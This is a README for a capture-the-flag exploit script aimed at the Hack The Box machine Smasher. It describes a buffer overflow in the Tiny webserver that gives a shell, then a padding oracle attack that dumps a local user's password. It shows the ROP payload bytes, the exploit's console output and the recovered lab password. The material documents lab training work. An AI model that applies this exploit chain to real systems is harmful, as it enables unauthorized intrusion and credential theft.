## Challenge

[Smasher](https://www.hackthebox.eu/home/machines/profile/141) from Hackthebox.eu

## Description

Performs a buffer overflow in the Tiny webserver running on Smasher to get a shell. With the shell, it performs a Padding Oracle Attack on a local service to dump credentials for smasher.

## Reference

Originally published in blog posts:
- https://0xdf.gitlab.io/2018/11/24/htb-smasher.html
- https://0xdf.gitlab.io/2018/11/24/htb-smasher-bof.html

## Dependencies

[python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)

## Usage

```
root@kali:~/hackthebox/smasher-10.10.10.89# python tiny_exploit.py
[*] BSS address: 603260
[*] plt read address: 400cf0
[*] payload: A..A%dd%11%40%00%00%00%00%00%04%00%00%00%00%00%00%00%db%11%40%00%00%00%00%00%60%32%60%00%00%00%00%00%60%32%60%00%00%00%00%00%f0%0c%40%00%00%00%00%00%60%32%60%00%00%00%00%00
[+] Opening connection to 10.10.10.89 on port 1111: Done
[+] Shell on 10.10.10.89 as www
Type 'shell' for shell, anything else to continue
>

[*] Connecting to 127.0.0.1 1337 for AES challenge
[*] data: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
[*] data is 64 bytes long, 4 blocks
[*] Attack Buffer:
00000000  ba 30 89 72  ff 9c 1f e5  5b 2c 55 ac  ed 23 c7 75  │·0·r│····│[,U·│·#·u│
00000010  a3 a8 52 a3  ab 68 82 a2  d8 21 31 86  a4 fb 17 76  │··R·│·h··│·!1·│···v│
00000020
plaintext:  user 'smasher' is: PaddingOracleMaster123\x06\x06\x06\x06\x06\x06
[*] Closed connection to 10.10.10.89 port 1111
```
